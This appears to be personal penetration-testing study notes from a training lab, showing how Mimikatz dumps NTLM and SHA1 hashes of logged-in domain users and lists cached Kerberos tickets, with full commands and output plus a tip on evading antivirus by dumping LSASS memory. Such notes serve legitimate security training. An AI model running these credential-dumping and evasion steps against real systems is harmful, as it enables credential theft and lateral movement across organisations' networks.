
See [AD Authentication](Active%20Directory.md#Authentication) for in-depth explanation of NTLM and Kerberos auth processes.


#### Scenario
- We've got elevated local admin privs on CLIENT75 as `jeff`

**192.168.x.70** - DC1
**192.168.x.72** - web04
**192.168.x.75** - client75

##### Hash dump
- Elevate privs
```powershell
whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 


Start-Process powershell.exe -Verb runas


whoami /groups
	GROUP INFORMATION
	-----------------
	...
	Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

- Start mimikatz
> Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an injector like PowerShell or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz.

```powershell
cd C:\Tools

.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

- Dump creds of all logged-in users
```powershell
# mimikatz #
privilege::debug
	Privilege '20' OK

sekurlsa::logonpasswords
	Authentication Id : 0 ; 7578418 (00000000:0073a332)
	Session           : Batch from 0
	User Name         : dave
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:51:28 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1103
	        msv :
	         [00000003] Primary
	         * Username : dave
	         * Domain   : CORP
	         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494             #<-- NOTE
	         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd     #<-- NOTE
	         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
	...
	Authentication Id : 0 ; 6858012 (00000000:0068a51c)
Session           : RemoteInteractive from 2                           #<-- NOTE
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 8/3/2024 11:43:06 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea                 #<-- NOTE
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f         #<-- NOTE
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
	...
```
	- Should dump all hashes for all logged in users including those RDP'd in (see `jeff`)

Hashes shown will vary based on AD implementation
- Only NTLM is available for AD instances at a functional level of Windows 2003
- NTLM and SHA-1 may be available for instances running Windows Server 2008 or later
- WDigest is enabled for older operating systems like Windows 7, or operating systems that have it manually set
	- When enabled, mimikatz will display cleartext alongside the hash


##### Abusing TGT & Service Tickets
- Create and cache a service ticket by listing the contents of the SMB share on web04
```powershell
dir \\web04.corp.com\backup
	    Directory: \\web04.corp.com\backup
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

- Use mimikatz to view the ticket stored in memory
```powershell
# mimikatz #
sekurlsa::tickets
	Authentication Id : 0 ; 6857791 (00000000:0068a43f)
	Session           : RemoteInteractive from 2
	User Name         : jeff
	Domain            : CORP
	Logon Server      : DC1
	Logon Time        : 8/3/2024 11:43:06 AM
	SID               : S-1-5-21-1987370270-658905905-1781884369-1105
	
	         * Username : jeff
	         * Domain   : CORP.COM
	         * Password : (null)
	
	        Group 0 - Ticket Granting Service                                                                            #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 12:07:44 PM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM
	           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             322c28d6c359900cb7005cdb41aedbfa1859bbae6edfaf59a56fe567b910ac3d
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 12       [...]
	         [00000001]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
	           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             fe1e7b604e288fb57e84dbea8ca6d03408f8119c5409a7e48edc56f4bf8167a5
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13       [...]
	
	        Group 1 - Client Ticket ?
	
	        Group 2 - Ticket Granting Ticket                                                                             #<-- NOTE
	         [00000000]
	           Start/End/MaxRenew: 8/3/2024 11:43:06 AM ; 8/3/2024 9:43:06 PM ; 8/10/2024 11:43:06 AM
	           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
	           Target Name  (02) : krbtgt ; corp.com ; @ CORP.COM
	           Client Name  (01) : jeff ; @ CORP.COM ( corp.com )
	           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
	           Session Key       : 0x00000001 - des_cbc_crc
	             5a7372545540bf0f0087ff02181492f0635cef46e6f2b78c61488918a95991a0
	           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```
	- Output shows both TGS & TGT
		- TGS allows access to only particular resources associated with those tickets
		- TGT allows us to request a TGS for specific resources we want to target within the domain



# AD PW Attacks


